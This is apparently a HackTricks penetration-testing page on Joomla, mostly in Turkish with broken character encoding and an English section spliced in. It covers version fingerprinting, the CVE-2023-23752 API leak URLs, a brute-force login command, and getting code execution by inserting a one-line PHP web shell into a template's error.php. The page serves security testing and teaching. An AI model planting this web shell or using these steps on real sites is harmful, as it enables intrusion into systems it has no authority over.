# Joomla

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> Ã¶ÄŸrenin!</strong></summary>

* **Bir siber gÃ¼venlik ÅŸirketinde mi Ã§alÄ±ÅŸÄ±yorsunuz? Åirketinizin HackTricks'te reklamÄ±nÄ± gÃ¶rmek ister misiniz? Ya da en son PEASS sÃ¼rÃ¼mÃ¼ne eriÅŸmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimizi**](https://opensea.io/collection/the-peass-family) gÃ¶rÃ¼n
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* **[ğŸ’¬](https://emojipedia.org/speech-balloon/) Discord grubuna** katÄ±lÄ±n veya [telegram grubuna](https://t.me/peass) veya **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** Ã¼zerinden PR gÃ¶nderin.

</details>

### Joomla Ä°statistikleri

Joomla, Joomla kurulumlarÄ±nda kullanÄ±lan Joomla, PHP ve veritabanÄ± sÃ¼rÃ¼mlerinin ve sunucu iÅŸletim sistemlerinin ayrÄ±ntÄ±lÄ± istatistiklerini toplar. Bu veriler, genel [API](https://developer.joomla.org/about/stats/api.html)leri Ã¼zerinden sorgulanabilir.
```bash
curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool

{
"data": {
"cms_version": {
"3.0": 0,
"3.1": 0,
"3.10": 6.33,
"3.2": 0.01,
"3.3": 0.02,
"3.4": 0.05,
"3.5": 12.24,
"3.6": 22.85,
"3.7": 7.99,
"3.8": 17.72,
"3.9": 27.24,
"4.0": 3.21,
"4.1": 1.53,
"4.2": 0.82,
"4.3": 0,
"5.0": 0
},
"total": 2951032
}
}
```
## NumaralandÄ±rma

### KeÅŸif/Ayak Ä°zi

* **meta** etiketlerini kontrol edin
```bash
curl https://www.joomla.org/ | grep Joomla | grep generator

<meta name="generator" content="Joomla! - Open Source Content Management" />
```
* robots.txt
```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
[...]
```
* README.txt

---

## Joomla

### Joomla Version Identification

Joomla version can be identified by checking the following files:

- `administrator/manifests/files/joomla.xml`
- `libraries/joomla/version.php`
- `libraries/src/Version.php`

### Joomla Vulnerability Scanning

1. Use tools like JoomScan to scan for vulnerabilities in Joomla websites.
2. Manually check for common vulnerabilities like SQL injection, XSS, and CSRF.

### Exploiting Joomla Vulnerabilities

1. Exploit vulnerabilities like SQL injection by manipulating input fields.
2. Exploit XSS vulnerabilities by injecting malicious scripts into web pages.
3. Exploit CSRF vulnerabilities by tricking users into performing unintended actions.

### Joomla Password Cracking

1. Use tools like Hashcat to crack Joomla password hashes.
2. Utilize password dictionaries and brute force attacks to crack weak passwords.

### Joomla Security Best Practices

1. Keep Joomla and its extensions up to date to patch known vulnerabilities.
2. Use strong and unique passwords for Joomla admin accounts.
3. Implement security extensions like firewall plugins to enhance Joomla security.

---
```
1- What is this?
* This is a Joomla! installation/upgrade package to version 3.x
* Joomla! Official site: https://www.joomla.org
* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```
### SÃ¼rÃ¼m

* **/administrator/manifests/files/joomla.xml** dosyasÄ±nda sÃ¼rÃ¼mÃ¼ gÃ¶rebilirsiniz.
* **/language/en-GB/en-GB.xml** dosyasÄ±nda Joomla'nÄ±n sÃ¼rÃ¼mÃ¼nÃ¼ alabilirsiniz.
* **plugins/system/cache/cache.xml** dosyasÄ±nda yaklaÅŸÄ±k bir sÃ¼rÃ¼mÃ¼ gÃ¶rebilirsiniz.
```bash
droopescan scan joomla --url http://joomla-site.local/
```
### API Kimlik DoÄŸrulamasÄ± YapÄ±lmamÄ±ÅŸ Bilgi SÄ±zdÄ±rma:
4.0.0 ile 4.2.7 sÃ¼rÃ¼mleri, Kimlik doÄŸrulamasÄ± yapÄ±lmamÄ±ÅŸ bilgi sÄ±zdÄ±rma (CVE-2023-23752) aÃ§Ä±ÄŸÄ±na sahiptir ve kimlik bilgilerini ve diÄŸer bilgileri sÄ±zdÄ±racaktÄ±r.

* KullanÄ±cÄ±lar: `http://<host>/api/v1/users?public=true`

* YapÄ±landÄ±rma DosyasÄ±: `http://<host>/api/index.php/v1/config/application?public=true`

**MSF ModÃ¼lÃ¼**: `scanner/http/joomla_api_improper_access_checks` veya ruby script: [51334](https://www.exploit-db.com/exploits/51334)

### Kaba Kuvvet SaldÄ±rÄ±sÄ±

GiriÅŸ yapmak iÃ§in bu [script'i](https://github.com/ajnik/joomla-bruteforce) kullanabilirsiniz.
```shell-session
sudo python3 joomla-brute.py -u http://joomla-site.local/ -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin

admin:admin
```
## RCE

EÄŸer **yÃ¶netici kimlik bilgilerine** sahip olduysanÄ±z, **RCE iÃ§ine girebilirsiniz** ve **RCE** elde etmek iÃ§in bir **PHP kodu parÃ§asÄ± ekleyebilirsiniz**. Bunun iÃ§in bir **ÅŸablonu Ã¶zelleÅŸtirerek** yapabiliriz.

1. `YapÄ±landÄ±rma` altÄ±nda alt sol kÃ¶ÅŸede **`Åablonlar`** Ã¼zerine **tÄ±klayÄ±n** ve ÅŸablonlar menÃ¼sÃ¼nÃ¼ aÃ§Ä±n.
2. Bir **ÅŸablon adÄ±na tÄ±klayÄ±n**. `Åablon` sÃ¼tunu baÅŸlÄ±ÄŸÄ± altÄ±nda **`protostar`**'Ä± seÃ§elim. Bu bizi **`Åablonlar: Ã–zelleÅŸtir`** sayfasÄ±na gÃ¶tÃ¼recektir.
3. Son olarak, **sayfa kaynaÄŸÄ±nÄ± aÃ§mak iÃ§in** bir sayfaya tÄ±klayabilirsiniz. **`error.php`** sayfasÄ±nÄ± seÃ§elim. AÅŸaÄŸÄ±daki gibi **kod yÃ¼rÃ¼tme elde etmek iÃ§in PHP tek satÄ±rlÄ±k bir kod ekleyeceÄŸiz**:
   ```php
   system($_GET['cmd']);
   ```
4. **Kaydet ve Kapat**
5. `curl -s http://joomla-site.local/templates/protostar/error.php?cmd=id`
